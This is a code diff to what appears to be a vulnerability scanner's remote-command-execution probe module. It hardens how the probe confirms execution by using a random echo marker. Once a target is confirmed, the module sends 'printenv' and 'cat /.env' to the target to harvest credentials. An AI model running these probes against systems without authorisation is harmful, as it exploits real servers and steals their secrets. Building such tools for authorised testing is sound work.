@@ -2,10 +2,17 @@
 
 Default off via RiskPolicy.rce_enabled. Never webshell, lateral movement, or
 destructive commands.
+
+Confirmation requires the exact echo of a per-probe **unpredictable** marker.
+A plain HTTP 200, a SPA fallback page, or an arbitrary JSON body is NOT proof
+of command execution — those cannot echo a random nonce the server never saw.
+Secret-reading commands (``printenv`` / ``cat /.env``) only run *after* that
+marker has been confirmed, so we never touch secrets on an unproven target.
 """
 
 from __future__ import annotations
 
+import secrets
 from typing import TYPE_CHECKING, Any
 
 from .common import EngineResult, make_finding
@@ -35,7 +42,9 @@ _ALLOWED_CAT_PATHS = frozenset(
     }
 )
 
-_ECHO_TOKEN = "aipocket-rce-proof"
+# Stable prefix kept only for readability in captured traffic; the security
+# property comes from the random suffix appended per probe, never from this.
+_MARKER_PREFIX = "aipocket-rce"
 
 
 def _command_allowed(command: str) -> bool:
@@ -50,9 +59,14 @@ def _command_allowed(command: str) -> bool:
             return False
         return parts[1] in _ALLOWED_CAT_PATHS
     if base == "echo":
-        # Only echo fixed token / short safe args
+        # Only echo safe args (the caller supplies a random marker token).
         return True
     return len(parts) <= 2
+
+
+def _new_marker() -> str:
+    """Return an unpredictable per-probe marker the target cannot precompute."""
+    return f"{_MARKER_PREFIX}-{secrets.token_hex(16)}"
 
 
 async def run_rce(
@@ -68,13 +82,17 @@ async def run_rce(
     path = entry.get("path") or ""
     method = (entry.get("method") or "POST").upper()
     param = entry.get("param") or "command"
-    proof_cmd = entry.get("proof_command") or f"echo {_ECHO_TOKEN}"
     secret_cmds = list(entry.get("secret_commands") or ["printenv", "cat /.env"])
 
     if not path:
         result.reason = "no rce path"
         return result
-    if not _command_allowed(proof_cmd):
+
+    # Ignore any Spec-provided fixed proof_command: proof MUST carry a fresh
+    # unpredictable marker so a canned/echoed response cannot fake confirmation.
+    marker = _new_marker()
+    proof_cmd = f"echo {marker}"
+    if not _command_allowed(proof_cmd):  # defensive; echo is always allowed
         result.reason = "proof command not in whitelist"
         return result
 
@@ -94,39 +112,39 @@ async def run_rce(
 
     resp = await _exec(proof_cmd)
     result.requests_used = prober.budget_consumed - before
-    confirmed = False
-    if resp is not None and resp.status_code == 200:
-        text = resp.text or ""
-        if _ECHO_TOKEN in text or "aipocket" in text.lower() or len(text) > 5:
-            confirmed = True
-        found = prober._extract_from_response(resp, ctx.hit, f"{spec.product}_rce_proof")
+
+    # Confirmation ONLY on exact echo of the random marker in a 200 response.
+    # No length heuristic, no substring of a static token — those false-positive
+    # on ordinary JSON / SPA fallbacks and are not evidence of execution.
+    confirmed = resp is not None and resp.status_code == 200 and marker in (resp.text or "")
+
+    if not confirmed:
+        result.reason = "rce not confirmed (marker not echoed)"
+        return result
+
+    # Proven: safe to read secrets now (still whitelist- and budget-gated).
+    for cmd in secret_cmds:
+        if result.requests_used >= spec.max_requests:
+            break
+        if not _command_allowed(cmd):
+            continue
+        resp = await _exec(cmd)
+        result.requests_used = prober.budget_consumed - before
+        found = prober._extract_from_response(resp, ctx.hit, f"{spec.product}_rce_secret")
         result.credentials.extend(found)
 
-    if confirmed:
-        for cmd in secret_cmds:
-            if result.requests_used >= spec.max_requests:
-                break
-            if not _command_allowed(cmd):
-                continue
-            resp = await _exec(cmd)
-            result.requests_used = prober.budget_consumed - before
-            found = prober._extract_from_response(resp, ctx.hit, f"{spec.product}_rce_secret")
-            result.credentials.extend(found)
-
-        result.findings.append(
-            make_finding(
-                vuln_class=spec.vuln_class,
-                product=spec.product,
-                target_origin=origin,
-                spec_id=spec.id,
-                cve_ids=spec.cve_ids,
-                confirmed=True,
-                summary=f"RCE minimal proof via {path}",
-                severity="critical",
-                credentials=result.credentials,
-                evidence={"path": path, "proof_command": proof_cmd},
-            )
+    result.findings.append(
+        make_finding(
+            vuln_class=spec.vuln_class,
+            product=spec.product,
+            target_origin=origin,
+            spec_id=spec.id,
+            cve_ids=spec.cve_ids,
+            confirmed=True,
+            summary=f"RCE minimal proof via {path} (marker echoed)",
+            severity="critical",
+            credentials=result.credentials,
+            evidence={"path": path, "proof_marker_prefix": _MARKER_PREFIX},
         )
-    else:
-        result.reason = "rce not confirmed"
+    )
     return result
